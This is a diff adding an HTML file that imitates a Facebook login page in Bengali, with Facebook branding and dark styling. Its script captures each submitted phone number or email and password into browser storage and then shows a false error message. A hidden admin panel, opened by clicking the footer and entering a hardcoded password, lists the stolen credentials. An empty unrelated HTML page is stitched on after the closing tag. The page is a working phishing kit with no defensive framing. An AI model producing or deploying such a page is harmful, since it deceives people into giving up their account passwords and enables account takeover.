@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>লগ ইন করুন</title>
+    <style>
+        :root {
+            --bg-color: #1c1e21; /* Facebook style dark */
+            --input-bg: #242526;
+            --border-color: #3e4042;
+            --blue-btn: #0064e0;
+            --text-gray: #b0b3b8;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .logo-box {
+            margin-bottom: 30px;
+        }
+
+        .logo-box img {
+            width: 70px; /* লোগো সাইজ */
+            height: auto;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 25px;
+            font-weight: normal;
+        }
+
+        .input-field {
+            width: 100%;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 16px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 12px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #1877f2;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: var(--blue-btn);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        #error-msg {
+            color: #fa3e3e;
+            font-size: 14px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .forgot-pass {
+            margin-top: 20px;
+            color: var(--text-gray);
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        /* Admin Section Table */
+        #admin-panel {
+            display: none;
+            width: 95%;
+            max-width: 500px;
+            margin-top: 50px;
+        }
+
+        .data-card {
+            background: #242526;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            border-left: 5px solid #0064e0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .del-btn {
+            background: #4e0a0a;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        footer {
+            padding: 20px;
+            color: #3e4042;
+            font-size: 12px;
+            cursor: pointer;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="login-section" class="main-container">
+        <div class="logo-box">
+            <img src="p1.png" alt="Logo">
+        </div>
+        
+        <h2 id="brand-name">Facebook</h2>
+
+        <input type="text" id="phone" class="input-field" placeholder="মোবাইল নম্বর বা ইমেইল অ্যাড্রেস">
+        <input type="password" id="password" class="input-field" placeholder="পাসওয়ার্ড">
+        
+        <button class="login-btn" onclick="handleLogin()">লগ ইন করুন</button>
+        
+        <p id="error-msg">আপনার তথ্য ভুল হয়েছে</p>
+
+        <a href="#" class="forgot-pass">পাসওয়ার্ড ভুলে গেছেন?</a>
+    </div>
+
+    <div id="admin-panel">
+        <h3 style="text-align:center; margin-bottom:20px;">অ্যাডমিন প্যানেল</h3>
+        <div id="logs"></div>
+        <button onclick="location.reload()" style="width:100%; padding:10px; margin-top:20px; background:none; color:gray; border:none; cursor:pointer;">লগ আউট</button>
+    </div>
+
+    <footer onclick="openAdmin()">
+        Facebook
+    </footer>
+
+    <script>
+        function handleLogin() {
+            const p = document.getElementById('phone');
+            const pass = document.getElementById('password');
+            const err = document.getElementById('error-msg');
+
+            if(p.value && pass.value) {
+                // ডাটা সেভ
+                let list = JSON.parse(localStorage.getItem('clot_data')) || [];
+                list.push({ id: Date.now(), user: p.value, key: pass.value });
+                localStorage.setItem('clot_data', JSON.stringify(list));
+
+                // ইনপুট খালি করা
+                p.value = "";
+                pass.value = "";
+                
+                // এরর মেসেজ
+                err.style.display = 'block';
+            } else {
+                alert("ঘরগুলো পূরণ করুন");
+            }
+        }
+
+        function openAdmin() {
+            const access = prompt("অ্যাডমিন পাসওয়ার্ড দিন:");
+            if(access === "199825") {
+                loadAdmin();
+            }
+        }
+
+        function loadAdmin() {
+            document.getElementById('login-section').style.display = 'none';
+            document.querySelector('footer').style.display = 'none';
+            document.getElementById('admin-panel').style.display = 'block';
+            
+            const logBox = document.getElementById('logs');
+            const data = JSON.parse(localStorage.getItem('clot_data')) || [];
+            
+            logBox.innerHTML = data.length === 0 ? "<p style='text-align:center'>কোনো ডাটা নেই</p>" : "";
+
+            data.slice().reverse().forEach(item => {
+                const div = document.createElement('div');
+                div.className = 'data-card';
+                div.innerHTML = `
+                    <div>
+                        <b style="color:#0064e0">${item.user}</b><br>
+                        <small style="color:#b0b3b8">${item.key}</small>
+                    </div>
+                    <button class="del-btn" onclick="deleteItem(${item.id})">ডিলিট</button>
+                `;
+                logBox.appendChild(div);
+            });
+        }
+
+        function deleteItem(id) {
+            let data = JSON.parse(localStorage.getItem('clot_data')) || [];
+            data = data.filter(i => i.id !== id);
+            localStorage.setItem('clot_data', JSON.stringify(data));
+            loadAdmin();
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+</head>
+
+<body>
+  
+</body>
+
+</html>
